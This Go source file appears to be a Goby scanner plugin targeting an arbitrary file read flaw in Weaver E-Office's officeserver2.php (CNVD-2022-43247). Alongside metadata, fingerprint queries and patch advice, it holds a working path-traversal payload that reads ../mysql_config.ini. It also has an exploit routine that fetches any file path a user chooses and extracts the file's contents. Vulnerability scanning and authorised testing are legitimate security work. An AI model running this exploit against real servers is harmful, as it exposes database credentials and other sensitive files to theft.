package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office officeserver2.php file reading vulnerability",
    "Description": "<p>Weaver E-Office is an office automation (Office Automation, OA) system developed by Weaver Network Technology Co., Ltd. It is a Web-based collaborative office platform that can help enterprises achieve an electronic, automated, and intelligent office environment.</p><p>There is an arbitrary file reading vulnerability in the Weaver E-Office officeserver2.php file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-03-23",
    "PostTime": "2024-03-01",
    "Author": "xjy",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the Weaver E-Office officeserver2.php file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update in time: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../mysql_config.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-43247"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office officeserver2.php 文件读取漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 E-Office 是一款由泛微网络科技股份有限公司开发的办公自动化（Office Automation，简称 OA ）系统。它是一种基于Web的协同办公平台，可以帮助企业实现电子化、自动化、智能化的办公环境。</p><p>泛微 E-Office officeserver2.php文件存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。</p>",
            "Recommendation": "<p>厂商已发布补丁以修复漏洞，请及时更新：<a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p>泛微 E-Office officeserver2.php文件存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office officeserver2.php file reading vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office is an office automation (Office Automation, OA) system developed by Weaver Network Technology Co., Ltd. It is a Web-based collaborative office platform that can help enterprises achieve an electronic, automated, and intelligent office environment.</p><p>There is an arbitrary file reading vulnerability in the Weaver E-Office officeserver2.php file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.</p>",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update in time: <a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the Weaver E-Office officeserver2.php file. An attacker can use this vulnerability to read any file on the server and obtain sensitive information on the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10930"
}`
	sendPayloadGMU7WY := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig(`/iweboffice/officeserver2.php?OPTION=LOADFILE&FILENAME=` + filePath)
		payloadRequestConfig.VerifyTls = true
		payloadRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadGMU7WY(hostinfo, `../mysql_config.ini`)
			success := resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `<DBSTEP>`) && strings.Contains(resp.RawBody, `</DBSTEP>`) && strings.Contains(resp.RawBody, `</FILE>`)
			if success {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path + "?" + resp.Request.URL.RawQuery
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "custom" {
				if resp, err := sendPayloadGMU7WY(expResult.HostInfo, goutils.B2S(stepLogs.Params["filePath"])); resp != nil && resp.StatusCode == 200 && strings.Contains(strings.ToUpper(resp.RawBody), `<DBSTEP>`) && strings.Contains(strings.ToUpper(resp.RawBody), `</DBSTEP>`) && strings.Contains(strings.ToUpper(resp.RawBody), `</FILE>`) {
					result := regexp.MustCompile(`<FILE>([\w\W]*)<\/FILE>`).FindStringSubmatch(resp.RawBody)[1]
					if len(result) > 0 {
						expResult.Success = true
						expResult.Output = result
					} else {
						expResult.Output = `文件不存在`
					}
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
